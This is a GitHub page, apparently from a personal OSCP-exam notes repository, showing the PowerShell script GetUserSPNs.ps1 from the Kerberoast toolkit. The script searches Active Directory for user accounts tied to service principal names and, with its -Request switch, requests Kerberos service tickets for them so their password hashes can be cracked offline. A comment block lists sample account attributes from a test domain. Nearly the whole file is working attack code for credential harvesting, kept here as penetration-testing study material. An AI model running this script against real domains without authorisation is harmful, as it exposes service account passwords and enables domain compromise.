




























































































































OSCP-Notes/GetUserSPNs.ps1 at 40b780f7c8646cf4ea2aba7245276aacd8545fbc · Andrew059/OSCP-Notes


















































Skip to content













 


 





























        In this repository
      

        All GitHub
      
↵


      Jump to
      ↵






No suggested jump to results





















        In this repository
      

        All GitHub
      
↵


      Jump to
      ↵





















        In this user
      

        All GitHub
      
↵


      Jump to
      ↵





















        In this repository
      

        All GitHub
      
↵


      Jump to
      ↵












 



        Dashboard


        Pull requests


      Issues



          Marketplace
 

      Explore


      Codespaces

Sponsors

      Settings



      MukoHung






        Sign out
      
























 



  New repository


    Import repository
  

  New gist


    New organization
  






















          Sorry, something went wrong.
        









































/  ...  /  
Andrew059  /  
OSCP-Notes  /  













Clear





Tip:
                    Type # to search pull requests
                

                  Type ? for help and tips
                





Tip:
                    Type # to search issues
                

                  Type ? for help and tips
                





Tip:
                    Type # to search discussions
                

                  Type ? for help and tips
                





Tip:
                    Type ! to search projects
                

                  Type ? for help and tips
                





Tip:
                    Type @ to search teams
                

                  Type ? for help and tips
                





Tip:
                    Type @ to search people and organizations
                

                  Type ? for help and tips
                





Tip:
                    Type > to activate command mode
                

                  Type ? for help and tips
                





Tip:
                    Go to your accessibility settings to change your keyboard shortcuts
                

                  Type ? for help and tips
                





Tip:
                    Type author:@me to search your content
                

                  Type ? for help and tips
                





Tip:
                    Type is:pr to filter to pull requests
                

                  Type ? for help and tips
                





Tip:
                    Type is:issue to filter to issues
                

                  Type ? for help and tips
                





Tip:
                    Type is:project to filter to projects
                

                  Type ? for help and tips
                





Tip:
                    Type is:open to filter to open content
                

                  Type ? for help and tips
                









              We’ve encountered an error and some results aren't available at this time. Type a new search or try again later.
            


            No results matched your search
          



              Top result
            








              Commands
            

              Type > to filter
            






              Global Commands
            

              Type > to filter
            






              Files
            








              Pages
            








              Access Policies
            








              Organizations
            








              Repositories
            








              Issues, pull requests, and discussions
            

              Type # to filter
            






              Teams
            








              Users
            








              Projects
            











              Modes
            








              Use filters in issues, pull requests, discussions, and projects
            







































































Search for issues and pull requests

#



Search for issues, pull requests, discussions, and projects

#



Search for organizations, repositories, and users

@



Search for projects

!



Search for files

/



Activate command mode

>



Search your issues, pull requests, and discussions

# author:@me



Search your issues, pull requests, and discussions

# author:@me



Filter to pull requests

# is:pr



Filter to issues

# is:issue



Filter to discussions

# is:discussion



Filter to projects

# is:project



Filter to open issues, pull requests, and discussions

# is:open











































































Andrew059

/

OSCP-Notes

Public






 




              Unwatch
            




              Stop ignoring
            




              Watch
            

1





Notifications

















                      Participating and @mentions
                    

                      Only receive notifications from this repository when participating or @mentioned.
                    










                      All Activity
                    

                      Notified of all notifications on this repository.
                    










                      Ignore
                    

                      Never be notified.
                    











Custom







                    Select events you want to be notified of in addition to participating and @mentions.
                  









                    Get push notifications on iOS or Android.
                  















                  Custom
                








                  Custom
                




                    Select events you want to be notified of in addition to participating and @mentions.
                  






                      Issues
                    




                      Pull requests
                    




                      Releases
                    




                      Discussions
                    









                      Security alerts
                    



  Apply

  Cancel


 







 

Fork
          0








 


          Starred
 1



 


          Star
 1


 


 



































Code







Issues
0






Pull requests
0






Actions







Projects
0






Wiki







Security






Insights



 
 



More


 



                    Code
 


                    Issues
 


                    Pull requests
 


                    Actions
 


                    Projects
 


                    Wiki
 


                    Security
 


                    Insights
 







Open in github.dev
Open in a new github.dev tab

Permalink







40b780f7c8





Switch branches/tags










Branches
Tags















View all branches















View all tags









OSCP-Notes/Empire/kerberoast-master/GetUserSPNs.ps1


        Go to file
      

 



 


Go to file
T
 

 
Go to line
L

 



    
                Copy path

 



Copy permalink

 


 





This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.









Andrew059

Add files via upload







Latest commit
40b780f
10 days ago






History











1
        
        contributor
      








            Users who have contributed to this file
          















      129 lines (118 sloc)
      
    6.11 KB
  


  Raw
   Blame
 






























              View raw
            





                View blame
              












# Edits by Tim Medin



# File:     GetUserSPNS.ps1



# Contents: Query the domain to find SPNs that use User accounts



# Comments: This is for use with Kerberoast https://github.com/nidem/kerberoast



#           The password hash used with Computer accounts are infeasible to 



#           crack; however, if the User account associated with an SPN may have



#           a crackable password. This tool will find those accounts. You do not



#           need any special local or domain permissions to run this script. 



#           This script on a script supplied by Microsoft (details below).



# History:  2016/07/07     Tim Medin    Add -UniqueAccounts parameter to only get unique SAMAccountNames



#           2016/04/12     Tim Medin    Added -Request option to automatically get the tickets



#           2014/11/12     Tim Medin    Created








[CmdletBinding()]



Param(



  [Parameter(Mandatory=$False,Position=1)] [string]$GCName,



  [Parameter(Mandatory=$False)] [string]$Filter,



  [Parameter(Mandatory=$False)] [switch]$Request,



  [Parameter(Mandatory=$False)] [switch]$UniqueAccounts



)








Add-Type -AssemblyName System.IdentityModel








$GCs = @()








If ($GCName) {



 $GCs += $GCName



} else { # find them



 $ForestInfo = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()



 $CurrentGCs = $ForestInfo.FindAllGlobalCatalogs()



 ForEach ($GC in $CurrentGCs) {



 #$GCs += $GC.Name



 $GCs += $ForestInfo.ApplicationPartitions[0].SecurityReferenceDomain



  }



}








if (-not $GCs) {



 # no Global Catalogs Found



 Write-Host "No Global Catalogs Found!"



 Exit



}








<#



Things you can extract



Name                           Value



----                           -----



admincount                     {1}



samaccountname                 {sqlengine}



useraccountcontrol             {66048}



primarygroupid                 {513}



userprincipalname              {sqlengine@medin.local}



instancetype                   {4}



displayname                    {sqlengine}



pwdlastset                     {130410454241766739}



memberof                       {CN=Domain Admins,CN=Users,DC=medin,DC=local}



samaccounttype                 {805306368}



serviceprincipalname           {MSSQLSvc/sql01.medin.local:1433, MSSQLSvc/sql01.medin.local}



usnchanged                     {135252}



lastlogon                      {130563243107145358}



accountexpires                 {9223372036854775807}



logoncount                     {34}



adspath                        {LDAP://CN=sqlengine,CN=Users,DC=medin,DC=local}



distinguishedname              {CN=sqlengine,CN=Users,DC=medin,DC=local}



badpwdcount                    {0}



codepage                       {0}



name                           {sqlengine}



whenchanged                    {9/22/2014 6:45:21 AM}



badpasswordtime                {0}



dscorepropagationdata          {4/4/2014 2:16:44 AM, 4/4/2014 12:58:27 AM, 4/4/2014 12:37:04 AM,...



lastlogontimestamp             {130558419213902030}



lastlogoff                     {0}



objectclass                    {top, person, organizationalPerson, user}



countrycode                    {0}



cn                             {sqlengine}



whencreated                    {4/4/2014 12:37:04 AM}



objectsid                      {1 5 0 0 0 0 0 5 21 0 0 0 191 250 179 30 180 59 104 26 248 205 17...



objectguid                     {101 165 206 61 61 201 88 69 132 246 108 227 231 47 109 102}



objectcategory                 {CN=Person,CN=Schema,CN=Configuration,DC=medin,DC=local}



usncreated                     {57551}



#>








ForEach ($GC in $GCs) {



 $searcher = New-Object System.DirectoryServices.DirectorySearcher



 $searcher.SearchRoot = "LDAP://" + $GC



 $searcher.PageSize = 1000



 $searcher.Filter = "(&(!objectClass=computer)(servicePrincipalName=*))"



 $searcher.PropertiesToLoad.Add("serviceprincipalname") | Out-Null



 $searcher.PropertiesToLoad.Add("name") | Out-Null



 $searcher.PropertiesToLoad.Add("samaccountname") | Out-Null



 #$searcher.PropertiesToLoad.Add("userprincipalname") | Out-Null



 #$searcher.PropertiesToLoad.Add("displayname") | Out-Null



 $searcher.PropertiesToLoad.Add("memberof") | Out-Null



 $searcher.PropertiesToLoad.Add("pwdlastset") | Out-Null



 #$searcher.PropertiesToLoad.Add("distinguishedname") | Out-Null








 $searcher.SearchScope = "Subtree"








 $results = $searcher.FindAll()



 



    [System.Collections.ArrayList]$accounts = @()



 



 foreach ($result in $results) {



 foreach ($spn in $result.Properties["serviceprincipalname"]) {



 $o = Select-Object -InputObject $result -Property `



 @{Name="ServicePrincipalName"; Expression={$spn.ToString()} }, `



 @{Name="Name";                 Expression={$result.Properties["name"][0].ToString()} }, `



 #@{Name="UserPrincipalName";   Expression={$result.Properties["userprincipalname"][0].ToString()} }, `



 @{Name="SAMAccountName";       Expression={$result.Properties["samaccountname"][0].ToString()} }, `



 #@{Name="DisplayName";         Expression={$result.Properties["displayname"][0].ToString()} }, `



 @{Name="MemberOf";             Expression={$result.Properties["memberof"][0].ToString()} }, `



 @{Name="PasswordLastSet";      Expression={[datetime]::fromFileTime($result.Properties["pwdlastset"][0])} } #, `



 #@{Name="DistinguishedName";   Expression={$result.Properties["distinguishedname"][0].ToString()} }



 if ($UniqueAccounts) {



 if (-not $accounts.Contains($result.Properties["samaccountname"][0].ToString())) {



 $accounts.Add($result.Properties["samaccountname"][0].ToString()) | Out-Null



 $o



 if ($Request) {



 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn.ToString() | Out-Null



                    }



                }



            } else {



 $o



 if ($Request) {



 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn.ToString() | Out-Null



                }



            }



        }



    }



}













            Copy lines
          



            Copy permalink
          

View git blame
Reference in new issue










  Go

 















 
        © 2022 GitHub, Inc.
        



Terms
Privacy
Security
Status
Docs
Contact GitHub
Pricing
API
Training
Blog
About















    You can’t perform that action at this time.
  




You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.








